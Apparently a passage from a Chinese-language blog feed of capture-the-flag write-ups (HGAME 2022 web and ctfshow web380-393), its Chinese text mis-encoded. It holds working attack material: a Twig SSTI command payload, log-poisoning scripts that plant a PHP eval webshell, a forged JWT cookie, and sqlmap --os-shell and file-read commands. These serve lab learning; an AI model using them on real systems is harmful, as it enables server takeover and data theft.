src="https://img-blog.csdnimg.cn/6abe78c323dd475d850362ea85b14b90.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥ä¹‹åå‘ç°æ˜¯twigæ¡†æ¶<br><img src="https://img-blog.csdnimg.cn/430d0333a13f4a8cb57a36010cc7d7d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰«ç›®å½•å‘ç°<img src="https://img-blog.csdnimg.cn/b44ce02bf42847e1af810ec398b0cda4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥/redirect.php<br>å‘ç°å­˜åœ¨ssti<br><img src="https://img-blog.csdnimg.cn/64e0d8978422400cbdd8f9a46dc503ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><a href="https://xz.aliyun.com/t/7518#toc-0">TWIG å…¨ç‰ˆæœ¬ é€šç”¨ SSTI payload</a></p><p>åˆ©ç”¨ä¸Šé¢å¾—payload<br>å¾—åˆ°é¢˜è§£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=&#123;&#123;[<span class="string">&quot;base64+/f*&quot;</span>,%<span class="number">200</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥/f*æ˜¯æ— å›æ˜¾å¾—<br>å¿…é¡»å‰é¢åŠ ä¸Šbase64ç¼–ç </p><h2 id="web-Vidar-shop-demo"><a href="#web-Vidar-shop-demo" class="headerlink" title="web Vidar shop demo"></a>web Vidar shop demo</h2><p>æ³¨å†Œç”¨æˆ·ç„¶åå‘ç°è´¦æˆ·æœ‰9999å…ƒï¼Œå•†åº—é‡Œé¢flagéœ€è¦1w<br>åº”è¯¥å°±æ˜¯é€»è¾‘æ¼æ´æˆ–è€…ç«äº‰ï¼Œç‚¹å‡»flagå•†å“å’Œå…¶ä»–ä¸€ä¸ªå•†å“è¿›è¡Œä¸‹å•<br>å…ˆæŠŠ20çš„æ”¯ä»˜ä¸€ä¸‹<br>å‘ç°ä¹‹åè¿˜å¯ä»¥åˆ é™¤é€€é’±<br>æŠ“åŒ…<br>ä¿®æ”¹uid<br><img src="https://img-blog.csdnimg.cn/0612f31e309b4a78a149094a0003756e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å½“ç‚¹å‡»åˆ é™¤æ—¶ï¼Œå‘èµ·ä¸€ä¸ªå¯¹åº”IDçš„åŒ…ï¼Œå°†idæ”¹ä¸ºflagå¯¹åº”id 2637æ”¾åŒ…å‘ç°é€€è¿˜äº†1wï¼Œå†æ¬¡è´­ä¹°flagï¼ŒæˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/29c35cb85bbd4fa5a2a1c981801caa51.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="web-LoginMe"><a href="#web-LoginMe" class="headerlink" title="web LoginMe"></a>web LoginMe</h2><p>è¿›å…¥åç›´æ¥å°è¯•sqlmapå‘ç°å¯ä»¥ä½¿ç”¨<br>ç›´æ¥sqlmapä¸€æŠŠæ¢­<br><img src="https://img-blog.csdnimg.cn/34d90f8e73804038a70fc18f6fe9b813.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾—åˆ°å¯†ç ç™»å½•å¾—åˆ°flag</p><h2 id="web-Comment"><a href="#web-Comment" class="headerlink" title="web Comment"></a>web Comment</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œä¸‹è½½æºç ï¼Œå‘ç°<br><img src="https://img-blog.csdnimg.cn/9ac0941e667c4ef282f3c3de0c20314f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>libxml_disable_entity_loader(false); å…è®¸å¤–éƒ¨å®ä½“ï¼Œwafäº†ä¸€äº›å…³é”®å­—<br><img src="https://img-blog.csdnimg.cn/377dad0cdbde4c7bad5fd81c8e572d88.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥å‘ç°senderå¿…é¡»ä¸ºadminï¼Œä½†æ˜¯è¾“å…¥å†…å®¹å´ä¸èƒ½æœ‰admin<br>å°è¯•åˆ©ç”¨ä¸€ç™¾ä¸‡ä¸ªå­—ç¬¦ç»•è¿‡preg_matchï¼Œä½†æ˜¯æ²¡æˆåŠŸ<br>ä¹‹åä¸ä¼šäº†ï¼ï¼ï¼<br><strong>ä¹‹åè¡¥ä¸Š</strong></p><h2 id="web-Markdown-online"><a href="#web-Markdown-online" class="headerlink" title="web Markdown online"></a>web Markdown online</h2><p>ä¸‹è½½é™„ä»¶<br>å¾—åˆ°æºç <br>çœ‹ç™»å½•æ§åˆ¶å™¨<br><img src="https://img-blog.csdnimg.cn/89ddcc913ac34e02b2d7cb5c81f2abb2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¦ä½¿passwordé•¿åº¦ä¸º16ä¸”=54g<br>ç”±äºtoUpperCase()å‡½æ•°ä½¿å¾—å­—ç¬¦éƒ½æ”¹ä¸ºå¤§å†™ï¼Œåˆ™ç™»å½•æ¡ä»¶æ— æ³•æˆç«‹<br>ä½†ç™»å½•å¤„åªè¦è®© toUpperCase æŠ›å‡ºå¼‚å¸¸å°±å¯ä»¥ç™»é™†æˆåŠŸï¼Œè®©passwordä¸ºæ•°ç»„å³å¯ä½¿å…¶é•¿åº¦ä¸º16ç»•è¿‡</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="attr">&quot;password&quot;</span>:[<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p>ç™»é™†åä¾¿ä¸ä¼šäº†ã€å“­ç¬‘ã€‘<br><a href="http://www.yongsheng.site/2022/02/17/HGAME%202022%20WEB/#more">ç¬¬4å‘¨é¢˜ç›®çš„å¤§ä½¬åšå®¢</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow é»‘ç›’æµ‹è¯•</title>
      <link href="/2022/01/15/ctfshow%20%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/01/15/ctfshow%20%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="é»‘ç›’æµ‹è¯•ç®€ä»‹"><a href="#é»‘ç›’æµ‹è¯•ç®€ä»‹" class="headerlink" title="é»‘ç›’æµ‹è¯•ç®€ä»‹"></a>é»‘ç›’æµ‹è¯•ç®€ä»‹</h2><blockquote><p>é»‘ç›’æµ‹è¯•åˆç§°åŠŸèƒ½æµ‹è¯•ï¼Œæ˜¯åœ¨ä¸äº†è§£ç¨‹åºå†…éƒ¨ç»“æ„å’Œå†…éƒ¨ç‰¹æ€§çš„æƒ…å†µä¸‹è¿›è¡Œçš„æµ‹è¯•æ–¹æ³•ï¼Œé»‘ç›’æµ‹è¯•åªéªŒè¯ç¨‹åºæ˜¯å¦èƒ½æŒ‰ç…§éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦çš„è§„å®šæ­£å¸¸ä½¿ç”¨ï¼Œæ˜¯å¦èƒ½é€‚å½“çš„æ¥æ”¶æ•°æ®å¹¶ç»™å‡ºé€‚å½“çš„è¾“å‡ºç»“æœï¼Œå¦‚é”™è¯¯æç¤ºï¼Œæˆ–æ­£ç¡®çš„ç•Œé¢ç­‰ã€‚</p></blockquote><p><a href="https://www.cnblogs.com/l199616j/p/11403666.html">é»‘ç›’æµ‹è¯•è¯¦ç»†ç®€ä»‹</a></p><h2 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h2><p>æ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸ªç½‘ç«™ï¼Œä¹‹åæ‰«ä¸€ä¸‹ç›®å½•å‘ç°page.phpä¸‹æœ‰ä¸œè¥¿æ‰“å¼€<br>çœ‹åˆ°<br><img src="https://img-blog.csdnimg.cn/bc45b3f918fe41878e72fad9719a273e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>äºæ˜¯payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page.php?id=flag</span><br></pre></td></tr></table></figure><h2 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h2><p>çœ‹æºç å‘ç°<br><img src="https://img-blog.csdnimg.cn/06100a50bcd040cfb55a0de607687548.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å®ƒä¸å…¶ä»–çš„æœ‰å·®åˆ«ï¼Œå¤šäº†ä¸ªæ–‡ä»¶å¤¹ï¼Œè®¿é—®å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/081e1a8e4d6e4b308ac9c898ffa7adb6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="web382ã€383"><a href="#web382ã€383" class="headerlink" title="web382ã€383"></a>web382ã€383</h2><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œåœ¨ç›¸åŒçš„æ–‡ä»¶ä¸‹ï¼Œå‘ç°éœ€è¦è´¦å·å¯†ç <br><img src="https://img-blog.csdnimg.cn/9cdc27d0198e417bb935e329ef9fbc25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ©ç”¨ä¸‡èƒ½å¯†ç å¾—åˆ°flag</p><h2 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h2><p>å’Œä¸Šé¢ä¸€æ ·ï¼Œè¿›å…¥ç›®å½•åå‘ç°ä¸‡èƒ½å¯†ç æ²¡ç”¨<br>çœ‹åˆ°æç¤º<br><img src="https://img-blog.csdnimg.cn/62e4f12f2f9d4cdb85d55b78ca59e86b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æƒ³åˆ°çˆ†ç ´<br>åˆ©ç”¨è„šæœ¬é€ å‡ºå¯†ç å­—å…¸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s1=string.ascii_lowercase</span><br><span class="line">s2=string.digits</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s1:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s2:</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> s2:</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> s2:</span><br><span class="line">p=i+j+k+l+m</span><br><span class="line">f.write(p+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>äºæ˜¯çˆ†ç ´<br>å¾—åˆ°å¯†ç   xy123<br>å¾—åˆ°flag</p><h2 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h2><p>æœ¬é¢˜å…ˆçˆ†ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°/installç›®å½•å­˜åœ¨<br>æŒ‰ç…§æç¤ºè®¿é—®/install/?install<br>ä¹‹åè®¿é—®/alsckdfyï¼Œè¿›è¡Œç™»å½•<br>å‘ç°è´¦å·å¯†ç ä¸çŸ¥é“ï¼Œäºæ˜¯sqlæ³¨å…¥<br>è‹¥æ˜¯å½“å‰æ— æ³•æ³¨å…¥åˆ™å‰å¾€382é¢˜æ³¨å…¥è·å–åˆå§‹è´¦å·å¯†ç <br>æ³¨å…¥åå‘ç°å¯†ç ä¸º<br><img src="https://img-blog.csdnimg.cn/5e0ac41798a74c8c95c46ac9914803ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è´¦å·ä¸ºadmin<br>ç™»å½•å¾—åˆ°flag</p><h2 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h2><p>çœ‹åˆ°é¡µé¢ï¼Œå…ˆç”¨å·¥å…·æ‰«ç›®å½•ï¼Œå‘ç°æ²¡æ‰«å‡ºæ¥ï¼Œä¹‹åçœ‹å¤§ä½¬åšå®¢ï¼Œå‘ç°å…·æœ‰<br>clear.phpå’Œinstallï¼ˆæ‰«æå·¥å…·å¤ªèœï¼ï¼ï¼ï¼‰ï¼Œé€šè¿‡åˆ†æï¼Œå‘ç°clear.phpå¯ä»¥ä¼ å‚å‚æ•°ä¸ºfile<br>(æ³¨æ„lock.datåœ¨installä¸‹)<br>å› æ­¤è¿›è¡Œ<br>?file=install/lock.dat<br><img src="https://img-blog.csdnimg.cn/021fb4446af342faade23895fa83ee5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æˆ–è€…å¯ä»¥åœ¨è¿™é‡Œå‘ç°ç›®å½•clear.php<br><img src="https://img-blog.csdnimg.cn/89d0af312bd14c14b60a8fffb449c2cf.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/96fa9ad559794b8b887b9fac7b22034a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="å¦‚å›¾æ“ä½œ"></p><p>ä¹‹åçš„æ­¥éª¤ä¸ä¸Šä¸€é¢˜ä¸€æ ·ï¼ˆè®¿é—®installâ€¦â€¦.ï¼‰</p><h2 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°ä¸Šä¸€é¢˜æ€è·¯éƒ½ä¸è¡Œï¼Œä¹‹åè¿›è¡Œå°è¯•<br>å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/e46e35b377664b25a6c0bd1cee9143c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®/debugå¾—åˆ°<br>é€šè¿‡ï¼Ÿfileä¼ å‚çœ‹æ—¥å¿—<br><img src="https://img-blog.csdnimg.cn/188a9c0dbd464c0a899ec4e5653c9860.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å¯ä»¥è®¿é—®ï¼Œä¹‹åè¯•ä¸€è¯•ä¸€å¥è¯æ”¾åœ¨uaä¸Šè¿›è¡Œä¼ å‚ï¼Œå‘ç°æ²¡æœ‰ä¼ å‚æƒé™<br>çœ‹å¤§ä½¬åšå®¢ï¼Œå¤§ä½¬æ˜¯åˆ©ç”¨unlinkå‡½æ•°å°†datæ–‡ä»¶åˆ æ‰<br>åˆ©ç”¨ï¼ˆå†™åœ¨uaä¸­ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> unlink(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹‹åè®¿é—®æ—¥å¿—ååœ¨è®¿é—®installå¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/8036e79d6634491bba538ff7c22e33cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹‹ååŒä¸Šä¸€æ ·å¾—åˆ°flag</p><h2 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h2><p>è¿›å…¥é¢˜ç›®è®¿é—®/alsckdfy/editor/<br>å‘ç°<br><img src="https://img-blog.csdnimg.cn/e3815dcc9d4d46c2a17e86a7ddb19344.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”±äºkindEditorç¼–è¾‘4.1.11æ˜¯å­˜åœ¨ä¸Šä¼ è¿‡æ»¤ä¸ä¸¥çš„æ¼æ´çš„ï¼Œå¯ä»¥ä¸Šä¼ txtæˆ–è€…zipæ–‡ä»¶ã€‚åŒæ—¶åœ¨ã€debugå¤„å­˜åœ¨åŒ…å«æ¼æ´<br>å› æ­¤<br>ä¸Šä¼ æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;metsys&#x27;</span>;</span><br><span class="line"></span><br><span class="line">strrev(<span class="variable">$a</span>)(<span class="string">&#x27;echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt; /var/www/html/1.php&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4b356e0bba974a83b47ae70e6f26e5d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹‹ååœ¨debugå¤„è®¿é—®<img src="https://img-blog.csdnimg.cn/f98cf8f0c2b14ca7ada556df6833ac58.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®1.phpå¾—åˆ°shell<br><img src="https://img-blog.csdnimg.cn/b0a47a327e4545948eeb7106601f2a45.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ–ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">cmd=<span class="string">b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2)</span><br><span class="line"><span class="built_in">print</span>(requests.post(url+<span class="string">&#x27;b.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;</span>&#125;).text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h2><p>è®¿é—®/debugå‘ç°æ²¡æƒé™<br>æŠ“åŒ…ï¼Œå‘ç°å…·æœ‰jwt<br>ä¿®æ”¹jwtï¼Œæ”¹ä¸ºadminï¼Œå¯†é’¥ä¸º123456<br>å°†ä¿®æ”¹åçš„jwtæ”¾å…¥cookieä¸­ï¼Œå‘ç°æœ‰æƒé™äº†<br><img src="https://img-blog.csdnimg.cn/0e385a40fa1e4598a5a7a7b2599bb625.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› æ­¤ä½¿ç”¨è„šæœ¬ï¼ˆä¸Šé¢˜ç”¨ç¬¬ä¸€ç§ä¹Ÿè¡Œï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://4c339478-478a-4112-9297-f8b173856bd3.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://4c339478-478a-4112-9297-f8b173856bd3.challenge.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">cmd=<span class="string">b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(cmd),</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MTk5MzQ3NywiZXhwIjoxNjQyMDAwNjc3LCJuYmYiOjE2NDE5OTM0NzcsInN1YiI6ImFkbWluIiwianRpIjoiZTFhODc1NjdkNmYwM2Y5ZGQxNmZlODY2Nzg3ZDk3NmMifQ._Tsdmo_BZuW_pk7XsGTZO-eZwhCj8tc9v1STILqweoI&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(requests.post(url+<span class="string">&#x27;b.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;</span>&#125;,headers=headers).text)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h2 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h2><p>æœ¬é¢˜çš„page.phpé¡µé¢å…·æœ‰sqlæ³¨å…¥ï¼Œåˆ©ç”¨sqlmapä¸€æŠŠæ¢­<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="comment">//15f7f758-ad69-4efd-b54e-70b958779879.challenge.ctf.show/page.php?id=1 --file-read /var/www/html/alsckdfy/check.php --batch</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a8b0184aa0f5463a8fbf0b5342fe8e06.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h2><p>æœ¬é¢˜page.phpæ²¡æœ‰æ³¨å…¥ç‚¹ï¼Œä¹‹åå‘ç°æœç´¢æ¡†ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰æ³¨å…¥ç‚¹<br>åŒä¸Š<br><img src="https://img-blog.csdnimg.cn/247626191008497fa6fd0e4fc0343307.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h2><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œåœ¨åŒä¸€ä¸ªä½ç½®å­˜åœ¨sqlæ³¨å…¥ï¼Œå› æ­¤sqlä¸€æŠŠæ¢­<br>ï¼ˆæœ¬é¢˜flagåœ¨/flagï¼‰<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://64ef671c-b75d-4b18-9a9c-653012b494eb.challenge.ctf.show/search.php?title=s&quot;</span> --os-shell -batch </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e83e33f403ef44b5b1df08c2ebc2e968.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h2><p>çœ‹åˆ°é¢˜ç›®ï¼Œç”¨ä¸Šé¢çš„æ–¹æ³•ï¼Œå‘ç°æ— æ³•os å’Œè¯»æ–‡ä»¶ï¼Œå› 